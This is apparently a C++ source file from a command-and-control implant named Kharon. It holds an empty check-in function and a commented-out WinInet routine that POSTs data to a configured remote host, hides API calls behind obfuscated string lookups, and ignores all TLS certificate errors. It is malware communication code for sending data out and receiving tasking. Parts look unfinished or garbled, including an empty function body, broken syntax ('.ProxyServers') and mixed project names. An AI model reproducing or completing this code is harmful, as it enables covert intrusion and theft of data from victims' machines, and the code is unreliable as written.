#include <Kharon.h>
#include <wininet.h>

auto DECLFN Web::Checkin(
    VOID
) -> BOOL {
}

// auto DECLFN Web::Send(
//     _In_      PVOID   Data,
//     _In_      UINT64  Size,
//     _Out_opt_ PVOID  *RecvData,
//     _Out_opt_ UINT64 *RecvSize
// ) -> BOOL {
//     HANDLE hSession = NULL;
//     HANDLE hConnect = NULL;
//     HANDLE hRequest = NULL;
//     ULONG  HttpAccessType = 0;
//     PWSTR  HttpProxy = .ProxyServers;
//     ULONG  HttpFlags = 0;
//     ULONG  OptFlags  = 0;
//     BOOL   Success   = 0;
//     PVOID  RespBuffer = NULL;
//     SIZE_T RespSize   = 0;
//     DWORD  BytesRead  = 0;
//     UINT32 ContentLength = 0;
//     ULONG  ContentLenLen = sizeof( ContentLength );
//     PWSTR  HttpEndpoint[6] = { 0 };
    
//     HttpFlags = INTERNET_FLAG_RELOAD;

//     hSession = VkCall<HINTERNET>( 
//         XprWininet, XPR( "InternetOpenW" ),   
//         WebConf.UserAgent, HttpAccessType,
//         HttpProxy, 0, 0
//     );
//     if ( !hSession ) {
//         ErrorHandler( NtLastError(), "open internet handle: %d\n" );
//     }
    
//     hConnect = VkCall<HINTERNET>( 
//         XprWininet, XPR( "InternetConnectW" ),
//         hSession, WebConf.Host, WebConf.Port,
//         WebConf.ProxyUserName, WebConf.ProxyPassword,
//         INTERNET_SERVICE_HTTP, 0
//     );
//     if ( !hConnect ) {
//         ErrorHandler( NtLastError(), "Connect to handle" );
//     }

//     HttpEndpoint[0] = L"/";

//     if ( WebConf.Secure ) {
//         HttpFlags |= INTERNET_FLAG_SECURE;
//         OptFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA   |
//             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
//             SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
//             SECURITY_FLAG_IGNORE_WRONG_USAGE       |
//             SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
//     }        

//     hRequest = VkCall<HINTERNET>( 
//         XPR( "wininet.dll" ), XPR( "HttpOpenRequestW" ), 
//         hConnect, L"POST", HttpEndpoint[0], NULL, 
//         NULL, NULL, HttpFlags, 0 
//     );

//     VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetSetOptionW" ), hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );

//     Success = VkCall<BOOL>( 
//         XPR( "wininet.dll" ), XPR( "HttpSendRequestW" ),
//         hRequest, WebConf.AddHeaders,
//         VkStr::LengthW( WebConf.AddHeaders ),
//         Data, Size
//     );
//     if ( Success ) {
//         Success = VkCall<BOOL>( 
//             XPR( "wininet.dll" ), XPR( "HttpQueryInfoW" ),
//             hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
//             &ContentLength, &ContentLenLen, NULL
//         );
//         if ( !Success ) {
//             ErrorHandler( NtLastError(), "Get content length" );
//         }
        
//         RespSize   = ContentLength;
//         RespBuffer = VkMem::Heap::Alloc( ContentLength );
        
//         VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetReadFile" ), hRequest, RespBuffer, RespSize, &BytesRead );

//         if ( RespBuffer ) *RecvData = RespBuffer;
//         if ( RecvSize   ) *RecvSize = RespSize;

//         Success = TRUE;            
//     } else {
//         if ( NtLastError() == 12029 ) {
//             Velkor->Session.Connected = FALSE;
//         } else {
//             VkShow( "{WEB} Failed in send request: %d\n", NtLastError() );
//         }

//         Success = FALSE;
//     }

// _U37_LEAVE:
//     if ( hSession ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hSession );
//     if ( hConnect ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hConnect );
//     if ( hRequest ) VkCall<BOOL>( XPR( "wininet.dll" ), XPR( "InternetCloseHandle" ), hRequest );

//     return Success;
// }
